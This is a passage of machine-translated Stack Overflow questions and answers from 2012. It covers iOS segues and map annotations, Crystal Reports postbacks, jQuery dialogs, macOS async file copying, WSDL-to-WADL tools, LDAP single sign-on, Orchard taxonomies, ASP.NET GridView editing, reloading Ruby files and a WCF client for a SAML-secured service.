    NSArray *selectedKey = [dictionary objectForKey:@"Key"];

    if ([selectedKey isEqual:@"Driver"]){

        self.driverDetailView.wikiItem = dictionary;
        [self.driverDetailView performSegueWithIdentifier:@"pushDriver" sender:dictionary];
        NSLog(@"Push Driver");
    }

    if ([selectedKey isEqual:@"Team"]) {
        NSLog(@"Push Team");
    }
}

-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

    NSLog(@"Preparing For Segue");
    if ([[segue identifier] isEqual:@"pushDriver"]) {
        self.driverDetailView=segue.destinationViewController;
    }

} 
```

由于某些原因

```
 [self.driverDetailView performSegueWithIdentifier:@"pushDriver" sender:dictionary];
 NSLog(@"Push Driver"); 
```

不允许我在开始时设置为“Self”，我收到一条错误消息：

> TableCell 没有可见的@interface 声明选择器 performSegueWithIdentifier

如果我使用“self.driverDetailView”我不会收到错误，但是当我选择单元格时没有任何反应。

继承人 Horizo​​ntalTableView.h

```
#import <UIKit/UIKit.h>
#import "HorizontalDetailView.h"
#import "HorizontalTableCell.h"
@interface HorizontalTableView : UITableViewController <UITableViewDelegate,   UITableViewDataSource> {

NSDictionary *_articleDictionary;
NSMutableArray *_reusableCells;

}

@property (nonatomic, retain) NSDictionary *articleDictionary;
@property (nonatomic, retain) NSMutableArray *reusableCells;

@end 
```

这是 Horizo​​ntalTableView.m

```
#import "HorizontalTableView.h"
#import "HorizontalTableCell.h"
#import "ControlVariables.h"
#import "HorizontalDetailView.h"

#define kHeadlineSectionHeight  26
#define kRegularSectionHeight   18

@interface HorizontalTableView ()

@end

@implementation HorizontalTableView
@synthesize articleDictionary = _articleDictionary;
@synthesize reusableCells = _reusableCells;

- (void)awakeFromNib{
    [self.tableView setBackgroundColor:kVerticalTableBackgroundColor];
    self.tableView.rowHeight = kCellHeight + (kRowVerticalPadding * 0.5) + ((kRowVerticalPadding * 0.5) * 0.5);
}

- (id)initWithStyle:(UITableViewStyle)style{
    self = [super initWithStyle:style];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad{
    [super viewDidLoad];

    self.articleDictionary = [NSDictionary dictionaryWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"Data" ofType:@"plist"]];
}

- (void)viewDidUnload{
    [super viewDidUnload];

    self.articleDictionary = nil;
    self.reusableCells = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:     (UIInterfaceOrientation)interfaceOrientation{

    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {

    return [self.articleDictionary.allKeys count];
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{

    return 1;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    static NSString *CellIdentifier = @"HorizontalCell";

    HorizontalTableCell *cell = (HorizontalTableCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil){
        cell = [[HorizontalTableCell alloc] initWithFrame:CGRectMake(0, 0, tableView.frame.size.width, tableView.frame.size.height)];
    }

    NSSortDescriptor* sortDescriptor = [NSSortDescriptor sortDescriptorWithKey:nil ascending:YES selector:@selector(localizedCompare:)];
    NSArray* sortedCategories = [self.articleDictionary.allKeys sortedArrayUsingDescriptors:[NSArray arrayWithObject:sortDescriptor]];

    NSString *categoryName = [sortedCategories objectAtIndex:indexPath.section];

    NSArray *currentCategory = [self.articleDictionary objectForKey:categoryName];

    cell.articles = currentCategory;

    return cell;
}

- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section{

    return section == 0 ? kHeadlineSectionHeight : kRegularSectionHeight;
}

- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section{

    UIView *customSectionHeaderView;
    UILabel *titleLabel;
    UIFont *labelFont;

    if (section == 0)
    {
        customSectionHeaderView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, tableView.frame.size.width, kHeadlineSectionHeight)];

        titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 0, tableView.frame.size.width, kHeadlineSectionHeight)];
        labelFont = [UIFont boldSystemFontOfSize:20];
    }
    else
    {
        customSectionHeaderView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, tableView.frame.size.width, kRegularSectionHeight)];

        titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 0, tableView.frame.size.width, kRegularSectionHeight)];

        labelFont = [UIFont boldSystemFontOfSize:14];
    }

    customSectionHeaderView.backgroundColor = [UIColor colorWithRed:0.01176471 green:0.01176471 blue:0.01960784 alpha:0.95];

    titleLabel.textAlignment = UITextAlignmentLeft;
    [titleLabel setTextColor:[UIColor whiteColor]];
    [titleLabel setBackgroundColor:[UIColor clearColor]];
    titleLabel.font = labelFont;

    NSSortDescriptor* sortDescriptor = [NSSortDescriptor sortDescriptorWithKey:nil ascending:YES selector:@selector(localizedCompare:)];
    NSArray* sortedCategories = [self.articleDictionary.allKeys sortedArrayUsingDescriptors:[NSArray arrayWithObject:sortDescriptor]];

    NSString *categoryName = [sortedCategories objectAtIndex:section];

    titleLabel.text = [categoryName substringFromIndex:1];

    [customSectionHeaderView addSubview:titleLabel];

    return customSectionHeaderView;
}

-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

    NSLog(@"Preparing For Segue");
}

@end 
```

Horizo​​ntalTableCell.h 的代码是：

```
#import <UIKit/UIKit.h>
#import "HorizontalDetailView.h"
#import "DriverDetailView.h"
#import "HorizontalTableView.h"
@interface HorizontalTableCell : UITableViewCell <UITableViewDelegate, UITableViewDataSource> {

    UITableView *_horizontalTableView;
    NSMutableArray *_articles;
    HorizontalTableCell *horizontalTableCell;

}

@property (nonatomic, strong) UITableView *horizontalTableView;
@property (nonatomic, strong) NSMutableArray *articles;
@property (nonatomic, strong) HorizontalDetailView *horizontalDetailView;
@property (nonatomic, strong) DriverDetailView *driverDetailView;
@property (nonatomic, strong) HorizontalTableCell *horizontalTableCell;
@end 
```

Horizo​​ntalTableCell.m 的代码是：

```
#import "HorizontalTableCell.h"
#import "ControlVariables.h"
#import "ArticleCell.h"
#import "HorizontalDetailView.h"
@implementation HorizontalTableCell

@synthesize horizontalTableView = _horizontalTableView;
@synthesize articles = _articles;
@synthesize horizontalDetailView;
@synthesize driverDetailView;
@synthesize horizontalTableCell;

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    return [self.articles count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    static NSString *CellIdentifier = @"Cell";

    ArticleCell *cell = (ArticleCell *)[tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil){
        cell = [[ArticleCell alloc] initWithFrame:CGRectMake(0, 0, kCellWidth, kCellHeight)];
    }

    NSDictionary *currentArticle = [self.articles objectAtIndex:indexPath.row];

    cell.thumbnail.image = [UIImage imageNamed:[currentArticle objectForKey:@"Image"]];
    cell.titleLabel.text = [currentArticle objectForKey:@"Title"];

    return cell;
}

- (void)dealloc{
    self.horizontalTableView = nil;
    self.articles = nil;
}

- (NSString *) reuseIdentifier{
    return @"HorizontalCell";
}

- (id)initWithFrame:(CGRect)frame{
    if ((self = [super initWithFrame:frame])){
        self.horizontalTableView = [[UITableView alloc] initWithFrame:CGRectMake(0, 0, kCellHeight, kTableLength)];
        self.horizontalTableView.showsVerticalScrollIndicator = NO;
        self.horizontalTableView.showsHorizontalScrollIndicator = NO;
        self.horizontalTableView.transform = CGAffineTransformMakeRotation(-M_PI * 0.5);
        [self.horizontalTableView setFrame:CGRectMake(kRowHorizontalPadding * 0.5, kRowVerticalPadding *
                                                      0.5, kTableLength - kRowHorizontalPadding, kCellHeight)];

        self.horizontalTableView.rowHeight = kCellWidth;
        self.horizontalTableView.backgroundColor = kHorizontalTableBackgroundColor;

        self.horizontalTableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine;
        self.horizontalTableView.separatorColor = [UIColor clearColor];

        self.horizontalTableView.dataSource = self;
        self.horizontalTableView.delegate = self;
        [self addSubview:self.horizontalTableView];
    }

    return self;
}

-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

    NSDictionary *dictionary = [_articles objectAtIndex:indexPath.row];
    NSArray *selectedKey = [dictionary objectForKey:@"Key"];
    // NSLog(@"Selected Key = %@",selectedKey);

    if ([selectedKey isEqual:@"Driver"]){

        self.driverDetailView.wikiItem = dictionary;
        [self performSegueWithIdentifier:@"pushDriver" sender:self];
        NSLog(@"Push Driver");
    }

    if ([selectedKey isEqual:@"Team"]) {
        NSLog(@"Push Team");
    }

    if ([selectedKey isEqual:@"Tech"]) {
        NSLog(@"Push Tech");
    }

    if ([selectedKey isEqual:@"Track"]) {
        NSLog(@"Push Track");
    }

    //self.horizontalDetailView.wikiItem = dictionary;

    // NSLog(@"selected Array = %@",dictionary);

}

-(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {

    NSLog(@"Preparing For Segue");
    if ([[segue identifier] isEqual:@"pushDriver"]) {
        self.driverDetailView=segue.destinationViewController;
    }
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:29:48.510

如果我理解正确，您的 segues 已连接到表格视图单元格。如果这是正确的，我建议将它们从视图控制器本身挂钩到目标视图控制器，然后调用`[self performSegueWithIdentifier:@"pushDriver"];`您的`didSelectRowAtIndexPath:`方法。

# asp.net - 回发后如何使水晶报表查看器显示报表

> ID：10305851
> 
> 赞同：0
> 
> 时间：2012-04-24T20:54:53.470
> 
> 标签：asp.net, crystal-reports, crystal-reports-2010

我的页面上有一个下拉列表、一个标签和一个 CR 查看器。当我从 DD 中选择报告时，我会更新标签以显示当前选择的报告，并更新 CRV 以显示报告。

标签更新很好，我只是把它放在那里作为测试，以确保其他控件正确更新。另一方面，CRV 总是落后一个请求。我选择了一份报告，但它没有显示出来。我选择了另一份报告，然后出现了我之前选择的报告。

下面发布的代码来自我添加标签之前的代码，但没有其他任何更改。

```
using System;
using DataAccess;
using CrystalDecisions.CrystalReports.Engine;

namespace Reporting
{
    public partial class CRViewer : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (IsPostBack) return;
            ReportDropDown.Items.Add("Select a report");

            var reports = Data.ExecutSql("select * from ngmasterdb..reports");
            while (reports.Read()) ReportDropDown.Items.Add(reports["Name"].ToString());
            reports.Close();
        }

        protected void ReportDropDown_SelectedIndexChanged(object sender, EventArgs e)
        {
            var reportInfo = Data.ExecutSql("select * from ngmasterdb..reports where Name = '" + ReportDropDown.SelectedValue.Replace("'", "''") + "'");

            try
            {
                ReportDocument rptdoc = new ReportDocument();

                if (!reportInfo.Read()) return;
                var file = reportInfo["ReportFile"].ToString();
                if (file == null || file.Trim() == "") return;

                ReportSource.Report.FileName = file;
                CrystalReportViewer1.RefreshReport();
            }
            finally
            {
                reportInfo.Close();
            }
        }
    }
} 
```

我相信对 aspx 唯一感兴趣的是，对于 DropDown 控件，AutoPostBack 设置为 true。如果您仍然想查看 aspx，请告诉我，我会发布它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T23:26:56.273

最初我基本上是这样做的：

```
ReportSource.Report.FileName = rptFileName;
CrystalReportViewer1.ReportSource = ReportSource; 
```

当我摆脱 ReportSource （一个 CrystalDecisions.Web.CrystalReportSource 对象）并这样做时：

```
CrystalReportViewer1.ReportSource = rptFileName; 
```

然后它开始正常运行。我之前曾尝试过这种方法（或者至少我有信心这样做了，尽管现在看起来不是这样......）但是在文件路径方面遇到了一些错误。

我不知道为什么我在尝试此操作时遇到了以前的错误，而且我仍然不知道为什么即使使用我尝试的方法控制也不能正确运行，所以如果有人有任何关于此的信息，请随意提示我。

# objective-c - MKAnnotationView - MKAnnotation 参数警告

> ID：10305855
> 
> 赞同：0
> 
> 时间：2012-04-24T20:55:10.720
> 
> 标签：objective-c, ios, warnings, mkannotation, mkannotationview

我目前有一个地图视图，其中填充了几个遵循 MKAnnotation 协议的对象。有两种不同类型的对象，商店和竞争对手。不同的对象附有不同类型的数据。

加载 mapView 后，程序会自动将我们商店和竞争对手的所有图钉放到地图上。每个图钉都使用一个自定义图像。当您缩小到更大的区域时，显然屏幕会变得非常混乱。我已经查看了基于此博客中描述的接近度过滤对象：[http ://www.fiveminutes.eu/having-fun-with-ios-map-kit-grouping-annotations/](http://www.fiveminutes.eu/having-fun-with-ios-map-kit-grouping-annotations/)

但在与一些同事讨论后，我们决定尝试在地图区域更改为纬度或经度增量大于 1.0

我已经创建了方法并实现了在用户放大和缩小时实现在较小和较大引脚之间切换的过程，但我似乎无法摆脱这个警告：

`Sending "MKAnnotationView *" to parameter of incompatible type 'id<MKAnnotation>'`

我知道这意味着我们可能做错了什么，将来可能会导致问题，所以我想在几天内发布 v1.1 之前修复它。

以下方法是我如何测试我的区域是否已超出我想要更改引脚的点。usingLargeIcons 是一个布尔值，它只是阻止我们在图标已经达到所需大小时调用 change 方法。

```
-(void)mapView:(MKMapView *)mapViewChanged regionDidChangeAnimated:(BOOL)animated
{
    NSLog(@"latitudeDelta = %f",mapViewChanged.region.span.latitudeDelta);
    NSLog(@"longitudeDelta = %f",mapViewChanged.region.span.longitudeDelta);
    //Sanity check on region
    if(mapView.region.span.latitudeDelta < 1.0){
        if(!usingLargeIcons){
            [self transformPinsLarge];
        }
    }else{
        if(usingLargeIcons){
            [self transformPinsSmall];
        }
    }
} 
```

如您所见，此方法只是调用了两个转换方法。这些方法几乎相同，但有两个简单的单词变化 Small 和 Large。我的目标是获取地图上的所有引脚并将它们转储到一个阵列中，循环通过阵列并切换到较小的引脚。我不明白为什么我们会收到关于我们的对象不匹配的警告。如果我在 SO 的其他问题上错过了这一点，我深表歉意，请指出正确的方向，我将继续前进。我在 Google 上搜索了几个样式问题，但没有找到任何可以描述此对象警告的内容。

变换方法：

```
- (void)transformPinsSmall
{
    usingLargeIcons = NO;
    NSArray *allPins = [mapView annotations];
    for (MKAnnotationView *a in allPins) {
        //Gets small UIImage for brand, changes pin image
        [[mapView viewForAnnotation:a] setImage:[self imageForSmallAnnotation:a]];
    }
} 
```

警告在 for 循环中的代码行上。“imageForSmallAnnotation”方法只是返回一个 UIImage 对象。有人可以向我解释如何输入这些图像或如何转换我的方法声明，以便我可以删除这些错误吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:23:47.803

错误消息实际上是

```
Sending "MKAnnotationView *" to parameter of incompatible type 'id<MKAnnotation>' 
```

...相对于`id<MKAnnotationView>`?

如果是这样，那么问题是`[mapView annotations]`返回一个注释数组（即采用`MKAnnotation`协议的对象），并且您的 for 循环将这些对象强制转换为`MKAnnotationView`，然后会遇到问题。你可以试试：

```
for (id <MKAnnotation> a in allPins) { 
```

...这将解决`[mapView viewForAnnotation:a]`期望`a`成为采用`MKAnnotation`协议的对象但被发送到的对象却被强制转换的问题`MKAnnotationView`。

您可能还需要确保您的代码`[self imageForSmallAnnotation:]`正在接收它期望接收的对象类，如果以及何时更改要转换的对象`a`。

# javascript - Jquery ui 对话框导致嵌入脚本标签出现问题

> ID：10305857
> 
> 赞同：1
> 
> 时间：2012-04-24T20:55:14.560
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-dialog

当我在 div 中包含`<script>`标签并`.dialog()`在该 div 中使用时，我在使用 jqueryUI 对话框时遇到问题，javascript 被执行两次。

据我了解，这是因为对话框将我的 div 包含在另一个 div 中，导致浏览器再次解析内部 html。

[例子](http://jsfiddle.net/u7Pfd/)

不幸的是，我无法从 div 中删除脚本标签。我不知道如何解决这个问题，除了使用标志来标记我的 js 是否已执行，但它不能是唯一的解决方案。

有谁知道更好的方法来解决这个问题？

# macos - 在后台线程上未调用 FSCopyObjectAsync 回调方法

> ID：10305859
> 
> 赞同：1
> 
> 时间：2012-04-24T20:55:26.097
> 
> 标签：macos, asynchronous, copy, macos-carbon, core-foundation

我`FSCopyObjectAsync`用来跨卷复制文件。我已经使用[cimgf](http://www.cimgf.com/2008/05/03/cocoa-tutorial-file-copy-with-progress-indicator/)中的代码让我继续前进，并且运行良好。

我挂断的最后一个问题是复制状态回调没有发生在后台线程上。当我不通过 开始复制操作时`dispatch_async(copyQueue, ^{`，回调会被完美地调用。当我将它移到背景时，它不会触发。这是代码：

```
//Excerpt from existing method
// Create the semaphore, specifying the initial pool size
fd_sema = dispatch_semaphore_create(1);

dispatch_queue_t copyQueue = dispatch_queue_create("copy.theQueue", 0);
dispatch_group_t group = dispatch_group_create();

for(SearchPath * p in searchPaths) {
    dispatch_async(copyQueue, ^{

        NSString * newDestination = [NSString stringWithFormat:@"%@%@",destination,p.relativePath];
        NSString * source = [NSString stringWithFormat:@"%@%@",p.basePath,p.relativePath];
        NSError * error = nil;

        //Wait until semaphore is available  
        dispatch_semaphore_wait(fd_sema, DISPATCH_TIME_FOREVER);

        //Update progress window text
        [progressview.label setStringValue:[NSString stringWithFormat:@"Copying \"%@\" to \"%@\"",[source lastPathComponent],[destination lastPathComponent]]];

        if(p.isDirectory) {

            BOOL result = [[NSFileManager defaultManager] createDirectoryAtPath:newDestination withIntermediateDirectories:NO attributes:nil error:nil];

            if(result) {
                //Item was a directory
                dispatch_semaphore_signal(fd_sema);
            }

        }else{

            [self startCopy:source dest:[newDestination stringByDeletingLastPathComponent]];

        }

        if(error) {
            MTLogDebug(@"Error! : %ld", error.code);
        }
    }); //End async
} //End for loop

//End excerpt  

- (void)startCopy:(NSString *)source dest:(NSString *) destination
{
    // Get the current run loop and schedule our callback
    //TODO:Make this work while on a background thread
    CFRunLoopRef runLoop = CFRunLoopGetCurrent();
    FSFileOperationRef fileOp = FSFileOperationCreate(kCFAllocatorDefault);

    OSStatus status = FSFileOperationScheduleWithRunLoop(fileOp, runLoop, kCFRunLoopDefaultMode);
    if( status )
    {
        NSLog(@"Failed to schedule operation with run loop: %@", status);
        return;
    }

    // Create a filesystem ref structure for the source and destination and
    // populate them with their respective paths from our NSTextFields.
    FSRef sourceRef;
    FSRef destinationRef;

    //FSPathMakeRef( (const UInt8 *)[source fileSystemRepresentation], &sourceRef, NULL );
    FSPathMakeRefWithOptions((const UInt8 *)[source fileSystemRepresentation],
                             kFSPathMakeRefDefaultOptions, 
                             &sourceRef, 
                             NULL);

    Boolean isDir = true;
    //FSPathMakeRef( (const UInt8 *)[destination fileSystemRepresentation], &destinationRef, &isDir );    
    FSPathMakeRefWithOptions((const UInt8 *)[destination fileSystemRepresentation],
                             kFSPathMakeRefDefaultOptions, 
                             &destinationRef, 
                             &isDir);

    // Start the async copy.
    status = FSCopyObjectAsync (fileOp,
                                &sourceRef,
                                &destinationRef, // Full path to destination dir
                                NULL, // Use the same filename as source
                                kFSFileOperationDefaultOptions,
                                statusCallback,
                                0.1,
                                NULL);
    NSLog(@"Stat: %d",status);
    CFRelease(fileOp);

    if(status) {
        NSLog(@"Failed to begin asynchronous object copy: %d", status);
    }
}

static void statusCallback (FSFileOperationRef fileOp,
                            const FSRef *currentItem,
                            FSFileOperationStage stage,
                            OSStatus error,
                            CFDictionaryRef statusDictionary,
                            void *info)
{
    if (statusDictionary) {

        NSNumber *bytesCompleted = (__bridge NSNumber *) CFDictionaryGetValue(statusDictionary, kFSOperationBytesCompleteKey);

        NSURL *url = (__bridge NSURL *)convertedURLRef;

        if([bytesCompleted intValue] > 0) {

            if(stage == kFSOperationStageRunning) {

                //Update progress indicator
                [progressview.indicator setDoubleValue:progressview.indicator.doubleValue + [newNumberValue floatValue]];           
            }
        }
    }

    if (stage == kFSOperationStageComplete) {
        dispatch_semaphore_signal(fd_sema);
    }
} 
```

任何帮助或见解表示赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T21:15:20.500

问题是您将它与 一起使用`dispatch_async`，但`FSCopyObjectAsync`将复制操作回调绑定到特定的运行循环，从而绑定到特定的线程。

您需要做的*不是*使用`dispatch_async`，而是：

1.  在主线程上执行复制操作（这应该可以，就像`NSURLConnection`在主线程上执行一样可以）
2.  剥离一个辅助`NSThread`线程，在该线程上安排操作，然后通过调用`[[NSRunLoop currentRunLoop] run]`（或适当的变体）启动运行循环。

# wsdl - 可以从现有 wsdl 创建 wadl 的工具？

> ID：10305860
> 
> 赞同：2
> 
> 时间：2012-04-24T20:55:31.420
> 
> 标签：wsdl, wadl

我有个问题。我有现有的 Web 服务 (WSDL/SOAP)，需要具有相同功能的新 REST Web 服务。有没有一种从 WSDL 创建 WADL 的简单方法？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-25T15:15:20.747

虽然它不包含在分发 jar 中，但 tinyWSDL 具有 WSDL 2.0 -> WADL 转换器。显然，服务必须使用 HTTP 绑定来定义。必须首先将 WSDL 1.1 定义转换为 WSDL 2.0（tinyWSDL 也支持）。

[http://sourceforge.net/p/tinywsdl/code/HEAD/tree/TinyWSDLConverter/src/org/inb/bsc/wsdl20/converter/](http://sourceforge.net/p/tinywsdl/code/HEAD/tree/TinyWSDLConverter/src/org/inb/bsc/wsdl20/converter/)

干杯，

D.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-10T11:32:59.983

No.

SOAP and REST are pretty different approaches and this tool would be pretty hard to make or configure. Not saying that these styles cannot be mapped 1:1 to each other, there are things you can make with SOAP and not with REST and vice versa.

# asp.net - 当用户单击 url/link 时，凭据会自动传递并登录。有什么办法可以做到这一点

> ID：10305861
> 
> 赞同：0
> 
> 时间：2012-04-24T20:55:33.750
> 
> 标签：asp.net, authentication, ldap, single-sign-on

我在我的网站上当前登录假设我使用 Asp.net 4.0 开发的[http://www.abc.com 。](http://www.abc.com)

在这个站点有其他站点的 url 假设 http:www/newsite.com

两个站点都使用相同的 LDAP 服务器进行身份验证

**当用户单击 url/link(www.netsite.com/person/126) 时，凭据会通过并自动登录**。无需在其他站点再次登录

点击 www.abc.com 上的网址后，有什么方法可以自动登录 newssite.com。
您可以说用户不需要重新登录 newsite.com。因为他已经登录了 mysite 并且单击后其凭据显示在 url 上

*两个站点使用相同的数据库进行身份验证。
用于身份验证的数据库是 Windows 2008 LDAP 服务器*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T14:21:25.963

是的，例如，使用 SSO 中间件组件。但这与 LDAP 协议或目录信息树无关。目录服务器可以有效地用作 SSO 和其他身份验证信息的存储，而不是 SSO 机制本身。

# javascript - 改变使用 jQuery 的选项 我读过以下帖子：如何使用 jQuery 更改 <select>的选项？但是，我的文档有多个</select> 。我如何选择只更改其中之一？在上面设置一个ID。<select id="changeme">...</select> .... $("#changeme").. 首先你可以为选择标签分配一个id，即 <select id="sel1">< option value="1">选项 ID：10305869 赞同：0 时间：2012-04-24T20:56:07.627 标签：javascript, jquery, jquery-selectors 回答 #1 赞同：3 时间：2012-04-24T20:57:34.263 在上面设置一个ID。 <select id="changeme">...</select> .... $("#changeme").... 回答 #2 赞同：0 时间：2012-04-24T21:02:17.397 首先，您可以为选择标签分配一个ID，即 <select id="sel1"> <option value="1">Option 1</option> <option value="2">Option 2</option> <option value="3">Option 3</option> </select> <select id="another-select"> <option value="1">Option 1</option> <option value="2">Option 2</option> <option value="3">Option 3</option> </select> 然后更改您需要的特定 SELECT 标记： $('#sel1').html('<option value="1">New Option 1</option><option value="2">New Option 2</option><option value="3">New Option 3</option>');</select>

# content-management-system - CMS 中标签和分类之间的区别？

> ID：10305874
> 
> 赞同：0
> 
> 时间：2012-04-24T20:56:40.043
> 
> 标签：content-management-system, tags, orchardcms, taxonomy

是：标签与分类？

它们在概念上似乎是同一件事：对内容进行分类。虽然，分类法允许层次结构，而标签则不允许。在 Orchard 1.4 中，我们应该使用分类而不是标签吗？是否存在我们可以/应该两者兼而有之的情况？我想这个问题可能适用于任何 CMS 系统。

注意：我正在 Orchard 中构建模块，因此这决定了我这样做的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T22:35:59.127

截至今天，分类模块不处理“类别”的免费编辑。标签还提供自动完成功能。将来，Tags 将被弃用，而 Taxonomy 将被使用，但仅当 Taxonomy 能够处理免费词汇和自动完成时。

# asp.net - 处理事件时在 gridview 中显示 EditItemTemplate

> ID：10305877
> 
> 赞同：0
> 
> 时间：2012-04-24T20:57:02.510
> 
> 标签：asp.net

这必须很简单，但我很难找到它。

我有一个网格视图，我从中拉出 ObjectDataSource 并将所有数据连接放在后面的代码中。所以现在我必须手动编写数据源为我处理的所有事情（它确实为你处理了很多事情）。

所以在我的 rowEditing 事件中，我需要能够显示 EditItemTemplate。有任何想法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:13:59.830

男人！一天两次，我在发布后不久就找到了答案！

我缺少的步骤是在设置 editIndex 字段之前在事件中重新填充网格！所以这行得通

```
 protected void MyGrid_RowEditing(object sender, GridViewEditEventArgs e)
    {
        populateSubnetGrid();  //pulls from the Db and binds to the grid
        MyGrid.EditIndex = e.NewEditIndex;  //This is the selected row to edit
        MyGrid.DataBind();  //Make the edit Template show up

    } 
```

# ruby - 如何要求第二次

> ID：10305880
> 
> 赞同：24
> 
> 时间：2012-04-24T20:57:16.957
> 
> 标签：ruby, load, require

有没有办法`require`第二次强制执行文件？

我正在编写一个位于 Ruby 路径中的库。我正在编辑文件，同时在 IRB 中对其进行简单测试。

每次我对文件进行更改时，我都想在不结束 IRB 会话的情况下重新加载它。使用`load`需要每次输入文件的完整路径，每次重新启动 IRB 都需要我输入简单测试所需的所有其他变量设置。

我只想要类似的东西，`require`但这允许第二次加载。有没有简单的方法来做到这一点？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-04-24T21:05:01.307

`load`不需要（嗯）完整路径。它需要一个带有扩展名的完整文件名。

```
p load 'date.rb' #=> true
p load 'date.rb' #=> true
p load 'date'    #=> LoadError 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-24T21:01:20.247

```
:000> path = "extremely/long/path/to/my/file"
:001> load path
:002> load path 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-24T22:34:10.403

您可以编写自己的并将其放入您的 .irbrc 中：

**新热点**

```
module Kernel
  def reload(lib)
    if old = $LOADED_FEATURES.find{|path| path=~/#{Regexp.escape lib}(\.rb)?\z/ }
      load old
    else
      require lib
    end
  end
end 
```

**分钟老，因此被破坏**

```
module Kernel
  # Untested
  def reload(lib)
    if File.exist?(lib)
      load lib
    else
      lib = "#{lib}.rb" unless File.extname(lib)=='.rb'
      $:.each do |dir|
        path = File.join(dir,lib)
        return load(path) if File.exist?(path)
      end
    end
  end
end 
```

*对于旧版本，如果您想支持 RubyGems，则必须使其更加健壮。*

这两种解决方案的一个问题是，虽然它会强制重新加载有问题的文件，但如果*该*文件又调用`require`其他文件（通常是 gems 的情况），这些文件将不会被重新加载。

解决这个问题真的很丑陋。就像，也许手动进入`$LOADED_FEATURES`数组并删除所有看起来与 gem 名称相关的路径。*不寒而栗*

# c# - WCF 客户端使用 JAVA Web 服务 - 我应该使用 WCF 还是只创建自定义解析器/消息工厂？

> ID：10305882
> 
> 赞同：7
> 
> 时间：2012-04-24T20:57:30.207
> 
> 标签：c#, wcf, web-services, soap, saml-2.0

我们有一个业务合作伙伴要求我们使用 SAML 2.0 断言创建服务请求消息。该合作伙伴为其 JAVA Web 服务提供了两个证书和一个测试工具。

我创建了一个 WCF 客户端，`CustomBinding`尝试重新创建请求并使用服务，但我对 WCF 的细微差别感到非常沮丧（以及缺乏对 SAML 2.0 的内在支持）我想知道我是否更好关闭使用类似`WebClient`or`HttpWebRequest`和加密/构建和签署 XML Web 请求并对响应执行相同操作。我知道这涉及到很多工作，但至少我可以完全掌控。

非常感谢您的建议，我正在使用的内容如下所示

**注意：我收到了用于 Java 服务的 SoapUI 测试工具**

**供应商向我提供了这个请求（通过 SOAPUI 运行并通过 Fiddler 提取）**

```
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
  <SOAP-ENV:Header xmlns:wsa="http://www.w3.org/2005/08/addressing">
    <wsse:Security SOAP-ENV:mustUnderstand="1" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <xenc:EncryptedKey Id="EncKeyId-29B98C291D1FDFB39113352984774895">
        <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-1_5"/>
        <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
          <wsse:SecurityTokenReference>
            <ds:X509Data>
              <ds:X509IssuerSerial>
                <ds:X509IssuerName>CN=test_server</ds:X509IssuerName>
                <ds:X509SerialNumber>12356789</ds:X509SerialNumber>
              </ds:X509IssuerSerial>
            </ds:X509Data>
          </wsse:SecurityTokenReference>
        </ds:KeyInfo>
        <xenc:CipherData>
          <xenc:CipherValue>
            <!--Omitted -->
          </xenc:CipherValue>
        </xenc:CipherData>
        <xenc:ReferenceList>
          <xenc:DataReference URI="#EncDataId-3"/>
        </xenc:ReferenceList>
      </xenc:EncryptedKey>
      <wsse:BinarySecurityToken EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary" ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3" wsu:Id="CertId-29B98C291D1FDFB39113352984773591" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"><!--Omitted --></wsse:BinarySecurityToken>
